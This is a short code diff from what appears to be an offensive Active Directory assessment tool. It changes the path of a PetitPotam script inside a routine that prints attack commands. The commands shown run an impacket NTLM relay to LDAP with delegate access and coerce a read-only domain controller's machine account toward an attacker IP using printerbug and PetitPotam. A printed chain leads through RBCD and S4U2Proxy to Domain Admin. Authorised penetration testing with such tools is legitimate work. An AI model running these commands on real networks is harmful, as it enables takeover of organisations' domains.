@@ -345,7 +345,7 @@ def run():
         arrow(f"impacket-ntlmrelayx -t ldap://{dc} --delegate-access -smb2support")
         info("Then coerce RODC machine account:")
         arrow(f"impacket-printerbug {dom}/{user}:'{pw}'@{rodc_target} {attacker_ip}")
-        arrow(f"python3 PetitPotam.py {attacker_ip} {rodc_target} -u '{user}' -p '{pw}' -d {dom}")
+        arrow(f"python3 tools/PetitPotam/PetitPotam.py {attacker_ip} {rodc_target} -u '{user}' -p '{pw}' -d {dom}")
         info("RODC machine account → RBCD write on Writable DC → S4U2Proxy → DA")
         add_finding(
             "RODC Coercion to Writable DC Relay",
